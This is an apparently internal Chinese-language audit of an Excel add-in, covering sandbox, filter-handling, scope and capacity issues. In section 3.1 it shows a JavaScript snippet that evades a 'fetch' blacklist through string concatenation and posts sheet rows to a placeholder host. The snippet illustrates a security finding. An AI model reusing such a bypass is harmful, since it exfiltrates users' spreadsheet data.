# Excel Bro 能力边界问题清单

更新时间：2026-08-29

## 1. 文档目的

本文记录当前代码评估中发现的能力边界、安全风险和实现不一致，供后续排期、修复与发布验收使用。

评估对象包含：

- 当前 `main` 分支已有能力；
- 当前工作区尚未提交的计划编辑器、`computeValues` 和 `computeScript` 等改动；
- Office.js 当前工作簿模式与 openpyxl 文件夹模式；
- 前后端协议、执行预检、结果验收和自动化测试。

## 2. 总体判断

Excel Bro 当前适合定位为：

> 在用户授权的数据范围内，通过白名单 Excel 动作完成本地分析、操作预览、用户确认、执行和结果验收的单机 Excel 助手。

当前不宜承诺：

- 任意代码或脚本计算；
- 文件夹模式与 Excel 内执行完全等价；
- 对所有高级 Excel 对象进行无损编辑；
- 超过项目安全限额的超大数据处理；
- 企业级多人协作、云同步或细粒度权限管理。

## 3. P0：发布前必须处理

### 3.1 `computeScript` 沙箱不能保证禁止网络访问

#### 现状

当前工作区新增了 `computeScript` 动作，并在 `config/capabilities.json` 中设置：

```json
"sandbox": {
  "enabled": true,
  "allowReflection": false,
  "defaultTimeoutMs": 3000,
  "maxScriptChars": 8000,
  "maxOutputCells": 200000
}
```

脚本通过 Web Worker 中的 `new Function("rows", "helpers", script)` 执行。服务端和前端使用正则黑名单拦截 `fetch`、`XMLHttpRequest`、`WebSocket`、`Office`、`Excel` 等标识符。

#### 问题

Web Worker 并不天然等于“无网络环境”。脚本仍可能通过动态属性访问绕过文本黑名单，例如：

```js
self["fet" + "ch"]("https://example.invalid", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify(rows)
});
return rows;
```

当前黑名单只识别形如 `fetch(...)` 的直接调用，无法可靠阻止字符串拼接、别名、间接属性访问或其他混淆方式。

此外，宿主探针即使发现 `fetch` 等危险全局实际存在，`supported` 仍只由消息往返和 `worker.terminate()` 是否成功决定，没有把 `presentGlobals` 纳入失败条件。

相关文件：

- `apps/excel-addin/src/sandbox/computeWorker.ts`
- `apps/excel-addin/src/sandbox/sandboxSafety.ts`
- `apps/excel-addin/src/sandbox/workerProbe.ts`
- `server/app/safety.py`
- `config/capabilities.json`

#### 影响

- 与“禁止任意脚本、外部程序和网络脚本执行”的项目边界冲突；
- 授权工作表中的原始数据可能被脚本尝试发送到网络；
- 正则黑名单容易产生“看似隔离、实际上可绕过”的错误安全感；
- `computeScript` 被纳入 `AnalysisPlan` 白名单后，模型或计划编辑器都可能生成该动作。

#### 建议

短期：

1. 将 `sandbox.enabled` 恢复为 `false`；
2. 从模型可见的动作 schema 和提示词中移除 `computeScript`；
3. 在明确完成安全设计前，不把该动作作为产品能力发布。

长期如确需通用计算，应优先采用受控表达式、有限 DSL、预注册算子或确定性工具注册表，而不是执行模型生成的 JavaScript。

#### 验收标准

- 默认配置下任何计划都不能解析或执行 `computeScript`；
- 模型工具 schema 不包含 `computeScript`；
- README 和架构文档继续明确“不执行任意脚本”；
- 若未来重新启用，需要完成独立安全评审和真实宿主攻击测试，不能只依赖字符串黑名单。

### 3.2 文件夹模式忽略过滤条件，可能扩大破坏范围

#### 现状

协议允许以下动作携带 `filters`：

- `clearRange`
- `deleteRange`
- `copyRange`
- `removeDuplicates`

Office.js 当前工作簿模式具有按过滤结果定位行的执行逻辑。

#### 问题

`server/app/folder_workbooks.py` 中：

- `clearRange` 直接遍历整个 `action.range`，没有处理 `action.filters`；
- `copyRange` 复制整个 `sourceRange`，没有处理 `action.filters`；
- `deleteRange` 被明确拒绝；
- `removeDuplicates` 没有执行分支。

因此，原本表示“只清除符合条件的行”的计划，在文件夹模式可能清除整个区域。

#### 影响

- 破坏范围可能从命中行扩大到整个区域；
- 同一份 `AnalysisPlan` 在两种执行通道中的语义不同；
- 预览中显示的筛选条件与实际磁盘写入不一致；
- 这是数据安全问题，而不仅是功能缺失。

#### 建议

在完整实现前，文件夹预检必须拒绝所有携带 `filters` 的写入动作，并给出明确错误。后续实现时应复用确定性筛选语义及测试样例，保证与 Office.js 通道一致。

#### 验收标准

- 文件夹模式不会静默忽略任何动作字段；
- 未支持的 `filters` 在整份计划执行前即被拒绝；
- 增加“按值清除、复制、去重”的文件夹模式测试；
- 测试同时覆盖重复值、空值、未命中行、表头和多条件组合。

### 3.3 文件夹模式的 `removeDuplicates` 会被记录为成功但实际未执行

#### 现状

`removeDuplicates` 已存在于前后端协议和 Office.js 执行器中，但文件夹执行器没有对应动作分支，也没有把它列入 `unsupported` 集合。

文件夹执行循环末尾会统一追加：

```python
ActionExecutionResult(
    index=index,
    type=action.type,
    sheet=action.sheet,
    status="succeeded",
)
```

#### 影响

- 用户可能看到动作执行成功，但文件内容未改变；
- 验收只能落入 `executed_unverified`，无法弥补错误的 `succeeded` 状态；
- 破坏执行结果和诊断日志的可信度。

#### 建议

在实现前将 `removeDuplicates` 加入文件夹模式不支持列表；或者实现完整去重语义，并增加执行后值级验收。

#### 验收标准

- 每种白名单动作在文件夹执行器中必须满足“实现”或“预检明确拒绝”之一；
- 不允许未知或遗漏动作落入默认成功路径；
- 动作分发末尾增加穷尽性保护，未匹配动作必须抛错；
- 增加协议动作集合与两个执行器支持集合的一致性测试。

### 3.4 当前工作簿执行层没有强制用户选择的工作表边界

#### 现状

模型读取的数据快照只包含用户选择的工作表，但 Office.js 执行预检使用：

```ts
worksheets.items.map((worksheet) => worksheet.name)
```

即当前工作簿中的全部工作表。

计划编辑器虽然通过服务端 Pydantic 校验动作结构，但 `/api/plans/validate` 请求没有携带本次用户授权的工作表集合，因此服务端也无法执行作用域校验。

#### 问题

最终执行层只检查“工作表是否存在”，没有检查“工作表是否在本次授权范围内”。安全性依赖模型或编辑器不生成越权目标。

#### 影响

- 手工编辑或 AI 辅助修改后的计划可以指向未选择的现有工作表；
- 保存的工作流可能在执行时触达超出本次选择的工作表；
- 与项目约定“用户选择的工作表是不可扩大的授权边界”不一致。

#### 建议

把授权作用域作为执行参数下沉到最终预检，区分：

- 已授权的现有来源/目标工作表；
- 计划允许创建的新输出工作表；
- 明确获得用户额外确认的现有目标工作表。

不能仅依赖模型上下文、工作表存在性或计划预览来代替授权校验。

#### 验收标准

- Office.js 和文件夹模式都使用显式授权集合进行执行预检；
- 计划引用未授权现有工作表时，在任何写入发生前拒绝；
- 创建新输出表仍可通过，但不得借此覆盖同名未授权现有表；
- 计划编辑、AI 修改和固化工具重跑都必须重新绑定本次授权范围；
- 增加未授权读、写、删除、复制源和透视表源的回归测试。

## 4. P1：影响正确性和跨模式一致性

### 4.1 文件夹排序不是 Excel 原生行排序语义

文件夹模式当前读取指定区域的 `cell.value`，排序后再把值写回原单元格位置。这意味着：

- 样式留在原位置，不一定随记录移动；
- 批注、超链接、数据验证等对象不会随整行移动；
- 公式文本虽然会被搬动，但相对引用不一定像 Excel 原生排序一样调整；
- 验收只检查值顺序，无法发现对象错位。

建议在文档中把该能力表述为“值矩阵排序”，或者实现整单元格记录搬移并增加对象级测试。

### 4.2 文件夹模式只支持部分图表类型

协议允许：

- ColumnClustered
- BarClustered
- Line
- Pie
- Doughnut
- XYScatter
- Area
- Histogram
- Waterfall
- Funnel

openpyxl 执行器当前只映射前七类，Histogram、Waterfall 和 Funnel 会在执行阶段报不支持，而不是在整份计划预检阶段报告。

建议建立显式执行通道能力矩阵，并在计划生成或预检阶段拒绝当前通道不支持的图表类型。

### 4.3 openpyxl 不是无损 Excel 往返通道

文件夹模式支持 `.xlsx` 和 `.xlsm`，并对 `.xlsm` 使用 `keep_vba=True` 保留宏载荷，但不执行宏。仍需明确：

- 不保证切片器、复杂图表、外部连接和其他高级对象无损保留；
- 公式查询读取的是工作簿中的缓存值；
- 如果文件没有在 Excel 中重新计算并保存，查询可能读取旧缓存或空值；
- openpyxl 写入公式后不会像 Excel 一样立即计算结果。

因此文件夹模式应定位为“受支持动作的文件级处理”，不能承诺通用无损编辑。

### 4.4 当前工作区新增的 `computeValues` 绕过统一查询限额检查

常规当前工作簿查询在执行前检查：

- 最大 250,000 行；
- 最大 100 列；
- 最大 1,000,000 个单元格。

`computeValues` 直接调用分块读取累加器，没有复用常规查询入口中的总行数和总单元格预检。虽然按 5,000 行分块读取，但仍可能处理超出项目配置上限的数据。

建议把读取限额收敛到共享底层函数，避免不同入口各自决定是否校验。

### 4.5 `computeScript` 输入没有单元格数量上限

`computeScript` 直接加载整个 `sourceRange.values`，配置只限制脚本字符数、输出单元格数和运行时间，没有限制输入行数或输入单元格数。

即使未来解决隔离问题，也需要在读取前应用 `queryTable.maxRows`、`maxColumns` 和 `maxCells`，避免 Office.js 请求过大或 Worker 内存压力过高。

## 5. P2：产品说明与体验一致性

### 5.1 两种执行模式需要公开能力矩阵

当前 README 以统一动作列表描述项目能力，但实际支持情况不同：

| 能力 | Office.js 当前工作簿 | openpyxl 文件夹 |
| --- | --- | --- |
| 基础值、公式、格式 | 支持 | 支持，但部分语义不同 |
| 插入/删除区域 | 支持 | 不支持 |
| 数据透视表 | 支持，要求 ExcelApi 1.15 | 不支持 |
| 形状 | 支持，要求 ExcelApi 1.9 | 不支持 |
| 图表 | 协议内类型均可尝试 | 仅部分类型 |
| 多表关联查询 | 仅 union | 支持 deduplicate/join |
| `computeValues` | 当前工作区实验支持 | 不支持 |
| `computeScript` | 当前工作区实验支持且存在安全问题 | 不支持 |

建议把该矩阵加入 README 或独立用户文档，避免“协议支持”等同于“每个执行通道都支持”。

### 5.2 验收能力并未覆盖所有白名单动作

当前强验收覆盖较好的动作包括：

- 工作表创建/删除；
- 值、公式和表格写入；
- 清空内容；
- 排序、筛选和清除筛选；
- 表格对象；
- 常用格式、边框、数据验证和冻结窗格；
- 当前工作簿图表与数据透视表。

经常只能标记为 `executed_unverified` 的动作包括：

- 条件格式；
- 合并/取消合并；
- 自动适配；
- 超链接；
- 批注、备注；
- 名称区域；
- 图片和形状；
- 文件夹模式中的部分图表和对象属性。

对外文案应区分“可以发起动作”和“可以独立确认效果”。

### 5.3 计划编辑器实现与文档存在版本混杂

当前仓库同时存在：

- 独立窗口计划编辑器，保存时调用 `/api/plans/validate`；
- `usePlanEditor` 本地快速保存逻辑，只做 JSON 和有限白名单检查；
- 文档中“快速保存不请求服务端”和“必须经过服务端规范化”两种描述。

建议明确唯一正式路径，删除或标记备用实现，并保证所有保存入口都经过同一服务端 Pydantic 校验。

## 6. 当前容量边界

项目限额来自 `config/capabilities.json`：

| 项目 | 当前限制 |
| --- | ---: |
| 模型快照数据行 | 每表 200 行 |
| 模型快照数据列 | 每表 30 列 |
| 结构扫描 | 12 行 × 100 列 |
| 本地查询总行数 | 250,000 |
| 本地查询最大列数 | 100 |
| 本地查询总单元格 | 1,000,000 |
| 查询分块 | 5,000 行 |
| 查询结果行 | 最多 200 行 |
| 文件夹扫描文件数 | 100 |
| 文件夹会话 | 20 个，TTL 30 分钟 |
| 单份计划动作数 | 50 |
| 验收条件数 | 100 |
| Agent 工具轮次 | 8 |
| 图片附件 | 3 张 |
| 单张处理后大小 | 4 MB |
| 保存工具数量 | 50 |
| 对话数量 | 20 |

达到这些限制时，应明确返回“超出安全上限”，不能静默截断后给出完整性结论。

## 7. 测试与构建现状

2026-08-29 评估结果：

- 后端：`247 passed`；
- 前端：`331 passed / 3 failed`；
- 前端生产构建：通过；
- 尚未完成真实 Excel 宿主中的 Office.js、Web Worker、图表和数据透视表集成验收。

前端失败项：

1. 两个跨工作簿公式测试期望工作簿/工作表引用带单引号，实际输出没有单引号；
2. 加载新文件夹目录后，旧的工作表选择没有按测试预期清空。

这些失败不一定都代表最终用户路径不可用，但在发布前应明确预期行为并恢复全绿。

## 8. 建议修复顺序

1. 关闭并移除模型可见的 `computeScript`；
2. 文件夹模式预检拒绝携带未支持 `filters` 的写入动作；
3. 修复或明确拒绝文件夹 `removeDuplicates`，增加动作分发穷尽性保护；
4. 将授权工作表集合下沉到 Office.js 最终执行预检；
5. 统一所有计划编辑入口的服务端规范化与作用域重绑定；
6. 建立 Office.js/openpyxl 动作能力矩阵和一致性测试；
7. 统一 `computeValues` 与常规查询的容量限制；
8. 明确文件夹排序、图表和高级对象的能力口径；
9. 修复三个前端测试并进行真实 Excel 宿主冒烟测试；
10. 完成上述工作后，再评估是否把当前工作区实验能力合并到主线。

## 9. 发布门槛建议

满足以下条件后，再把当前版本视为可发布候选：

- 不存在默认启用的任意脚本执行入口；
- 所有写入动作都满足“已实现或预检明确拒绝”；
- 两种执行通道都强制本次用户授权作用域；
- 破坏性动作不会忽略筛选条件或其他约束字段；
- 前后端自动化测试全绿；
- Windows Excel 和 macOS Excel 至少各完成一次核心动作冒烟测试；
- README 明确说明格式、容量、执行通道和验收能力边界。
